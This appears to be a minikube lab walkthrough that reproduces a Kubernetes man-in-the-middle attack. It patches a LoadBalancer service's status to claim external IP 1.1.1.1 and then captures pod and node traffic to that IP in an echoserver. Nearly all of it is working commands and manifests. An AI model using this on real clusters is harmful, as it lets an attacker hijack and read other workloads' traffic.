Create namespace app
```
kubectl create ns app
```
Deploy "victim-client" pod to simulate an in-cluster HTTP client with curl

```
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: victim-client
  namespace: app
spec:
  containers:
    - name: curl
      image: curlimages/curl:7.67.0
      command: [ "/bin/sleep", "3600" ]
EOF
```

Check that we have access to our external victim (here 1.1.1.1)

```
# from a node
minikube ssh -p cenarioX
curl -sv http://1.1.1.1
curl -sv https://1.1.1.1 -k
# from the pod
kubectl exec -n app victim-client -- curl -sv http://1.1.1.1
kubectl exec -n app victim-client -- curl -sv https://1.1.1.1 -k

```

Deploy "mitm pod"

```
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Namespace
metadata:
  name: tcc
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: echoserver
  namespace: tcc
spec:
  replicas: 1
  selector:
    matchLabels:
      app: echoserver
  template:
    metadata:
      labels:
        app: echoserver
    spec:
      containers:
      - image: gcr.io/google_containers/echoserver:1.10
        name: echoserver
        ports:
        - name: http
          containerPort: 8080
        - name: https
          containerPort: 8443
EOF
```

external traffic interception using service type LoadBalancer

```
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: Service
metadata:
  name: mitm-external-lb
  namespace: tcc
spec:
  ports:
  - name: http
    port: 80
    targetPort: 8080
  - name: https
    port: 443
    targetPort: 8443
  selector:
    app: echoserver
  type: LoadBalancer
EOF
kubectl proxy --port=8080 &
sleep 3
curl -k -v -XPATCH  -H "Accept: application/json" -H "Content-Type: application/merge-patch+json" 'http://127.0.0.1:8080/api/v1/namespaces/tcc/services/mitm-external-lb/status' -d '{"status":{"loadBalancer":{"ingress":[{"ip":"1.1.1.1"}]}}}'
pkill kubectl
```

After the patch call, LoadBalancer IP is properly configured (ie not pending)

```
kubectl get -n tcc svc/mitm-external-lb
```

Test if the MITM works
```
# node -> ip
minikube ssh -p cenarioX
curl -sv http://1.1.1.1
curl -sv https://1.1.1.1 -k
# pod -> ip
kubectl exec -n app victim-client -- curl -sv http://1.1.1.1
kubectl exec -n app victim-client -- curl -sv https://1.1.1.1 -k
```

view traffic 

```
stern -n tcc echoserver
```